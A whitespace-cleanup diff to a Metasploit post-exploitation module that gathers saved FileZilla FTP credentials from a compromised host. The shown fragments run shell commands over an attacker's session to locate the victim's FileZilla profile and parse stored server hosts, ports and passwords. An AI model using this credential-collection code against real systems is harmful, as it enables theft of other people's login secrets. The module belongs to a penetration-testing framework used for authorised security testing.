@@ -23,7 +23,7 @@ class Metasploit3 < Msf::Post
 			'Name'           => 'Multi Gather FileZilla FTP Client Credential Collection',
 			'Description'    => %q{ This module will collect credentials from the FileZilla FTP client if it is installed. },
 			'License'        => MSF_LICENSE,
-			'Author'         => 
+			'Author'         =>
 				[
 					'bannedit', # post port, added support for shell sessions
 					'Carlos Perez <carlos_perez[at]darkoperator.com>' # original meterpreter script
@@ -85,10 +85,10 @@ class Metasploit3 < Msf::Post
 		else
 			userdirs = session.shell_command("ls #{home}#{whoami}/.filezilla")
 			if userdirs =~ /No such file/i
-				return 
+				return
 			else
 				print_status("Found FileZilla Client profile for: #{whoami}")
-				return ["#{home}#{whoami}/.filezilla"] 
+				return ["#{home}#{whoami}/.filezilla"]
 			end
 		end
 
@@ -215,7 +215,7 @@ class Metasploit3 < Msf::Post
 		doc = REXML::Document.new(data).root rescue nil
 		return [] if doc.nil?
 
-		doc.elements.to_a("//Server").each do |sub| 
+		doc.elements.to_a("//Server").each do |sub|
 			account = {}
 			account['host'] = sub.elements['Host'].text rescue "<unknown>"
 			account['port'] = sub.elements['Port'].text rescue "<unknown>"
@@ -238,7 +238,7 @@ class Metasploit3 < Msf::Post
 				account['password'] = "<blank>"
 			end
 			
-			case sub.elements['Protocol'].text 
+			case sub.elements['Protocol'].text
 			when "0"
 				account['protocol'] = "FTP"
 			when "1"
